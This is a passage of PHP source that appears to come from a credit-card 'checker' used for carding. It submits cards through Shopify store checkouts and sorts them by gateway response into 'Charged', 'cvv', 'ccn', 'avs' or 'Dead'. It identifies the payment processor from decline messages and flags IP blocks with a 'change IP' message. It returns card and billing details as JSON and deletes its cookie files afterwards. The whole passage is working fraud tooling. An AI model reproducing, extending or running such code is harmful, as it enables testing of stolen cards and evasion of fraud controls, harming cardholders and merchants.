elseif($msg2 == "CVV Validation Error  Failed" || $msg2 == "Do Not Honour Failed" || $msg2 == "Restricted Card Failed" || $msg2 == "Suspected Fraud Failed" || $msg2 == "Refer to Card Issuer" || $msg2 == "Refer To Issuer Failed" || $msg2 == "Do Not Honour"){
$type = "Shopify + Eway";
}
elseif($msg2 == "Restraint" || $msg2 == "Invalid Credit Card Number" || $msg2 == "Pickup" || $msg2 == "Invalid Institution Code" || $msg2 == "Call Voice Center" || $msg2 == "Do Not Honor" || $msg2 == "Declined call issuer" || $msg2 == "Invalid Transaction Type" || $msg2 == "Credit Floor" || $msg2 == "CVV2/CVC2 Failure"){
$type = "Shopify + Chasepaymentech";
}
elseif($msg2 == "Decline for CVV2 Failure" || $msg2 == "Closed Account" || $msg2 == "40187 - Verified Info - BIN country in high risk country - Decline" || $msg2 == "Security" || $msg2 == "Pick Up Card (No Fraud)" || $msg2 == "Suspected Fraud" || $msg2 == "Insufficient Funds" || $msg2 == "40161 - Email velocity - Daily - All transactions - Decline"){
$type = "Shopify + Chase";
}
elseif($msg2 == "40161 - Email velocity - Daily - All transactions - Decline" || $msg2 == "40229 - CardHolder Name Velocity - Daily - All transactions - Decline" || $msg2 == "40187 - Verified Info - BIN country in high risk country - Decline"){
$type = "Shopify + Chase Orbital Gateway";
}
elseif($msg2 == "Stolen or lost card" || $msg2 == "Inactive card or card not authorized for card-not-present transactions" || $msg2 == "General decline of the card" || $msg2 == "The card has reached the credit limit" || $msg2 == "Invalid card verification number" || $msg2 == "The authorization request was approved by the issuing bank but declined by CyberSource because it did not pass the AVS check" || strpos($msg2, 'Cybersource')){
$type = "Shopify + Cybersource";
}
elseif(strpos($checkout, '/checkouts/c/')){
$type = "Shopify + Stripe";
}
else{
$type = "Shopify";
}

if(strpos($r12, "https://$checkout/thank_you") || (strpos($r13, "https://$checkout/thank_you")) || (strpos($r14, "https://$checkout/thank_you"))){
$status1 = "Approved! ✅ -» Charged!";
$msg2 = "Thank You! -» $total_price";
}
elseif(strpos($r12, "https://$checkout/post_purchase") || (strpos($r13, "https://$checkout/post_purchase")) || (strpos($r14, "https://$checkout/post_purchase"))){
$status1 = "Approved! ✅ -» Charged!";
$msg2 = "Thanks for Purchase! -» $total_price";
}
elseif($msg2 == "Address not Verified - Approved" || $msg2 == "The authorization request was approved by the issuing bank but declined by CyberSource because it did not pass the AVS check" || $msg2 == "AVS result is declined by user" || strpos($msg2, 'avs') || strpos($msg2, 'AVS') || $msg2 == "AVS REJECTED" || $msg2 == "Billing address info was not matched by the processor"){
$status1 = "Approved! ✅ -» avs";
}
elseif($msg2 == "Address not Verified - Insufficient Funds" || $msg2 == "Transaction Normal - Insufficient Funds" || $msg2 == "Credit Floor" || $msg2 == "2001 Insufficient Funds" || $msg2 == "Insufficient Funds" || $msg2 == "Insuff Funds"){
$status1 = "Approved! ✅ -» cvv";
}
elseif($msg2 == "2010 Card Issuer Declined CVV" || $msg2 == "CVV does not match" || $msg2 == "Security codes does not match" || $msg2 == "CVD ERROR                       99048" || $msg2 == "CVV2 Mismatch" || $msg2 == "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number." || $msg2 == "CVC Declined" || $msg2 == "CVV Validation Error  Failed" || $msg2 == "CVV2/CVC2 Failure" || $msg2 == "Invalid card verification number" || $msg2 == "Decline for CVV2 Failure" || $msg2 == "Security code was not matched by the processor"){
$status1 = "Approved! ✅ -» ccn";
}
else{
$status1 = "Dead! ❌";
}

if($http_code == 430){
$status = false;
$status12 = "Cambia ip!";
}
elseif(empty($site1)){
$status = false;
$status12 = "not site!";
}
elseif($url == null){
$status = false;
$status12 = "not url!";
}
elseif($time == "60's"){
$status = false;
$status12 = "timeout!";
}
elseif(strpos($r4, 'reCAPTCHA')){
$status = false;
$status12 = "reCAPTCHA";
$msg2 = "reCAPTCHA";
}
elseif(strpos($r4, "https://$checkout/stock_problems")){
$status = false;
$status12 = "Out of stock";
$msg2 = "Out of stock";
}
else{
$status = true;
}

if($status12 == "Out of stock" || $status12 == "reCAPTCHA" || $status12 == "timeout!" || $status12 == "not url!" || $status12 == "not site!" || $status12 == "Cambia ip!"){
$err = array(
'status' => false,
'status12' => $status12,
);
header('Content-Type: application/json');
echo json_encode($err, JSON_UNESCAPED_UNICODE);
exit;
}

$ress = array(
  "status" => true,
  "status1" => $status1,
  "msg" => $msg2,
  "card" => $card,
  "type" => $type,
  "url" => $url,
  "total_price" => $total_price,
  "status2" => $status12,
  "retry" => $retry,
  "mail" => $mail,
  "nat" => $nat,
  "country" => $country,
  "street" => $street,
  "city" => $city,
  "state" => $state,
  "zip" => $zip,
  "time" => $time,
  "cartid_used" => $cartid11,
  "cartid_firts" => $cartid_first,
  "firts_min_price" => $first_min_price,
  "available_first" => $available_first,
  "cartid_last" => $cartid_last,
  "last_min_price" => $last_min_price,
  "available_last" => $available_last,
  "cart" => $cart,
  "sub_total_price" => $data,
  "checkout" => "https://$checkout",
  "shipping" => $shipping,
  "pay" => $pay,
  "id" => $id,
);
header('Content-Type: application/json');
echo json_encode($ress, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

$directorio = "/home/$hosting1/www/auto/";
$directorio = "/home/$hosting1/auto/";
$archivos = scandir($directorio);
foreach ($archivos as $archivo) {
if (strpos($archivo, 'cookie') !== false) {
unlink($directorio . '/' . $archivo);
}
}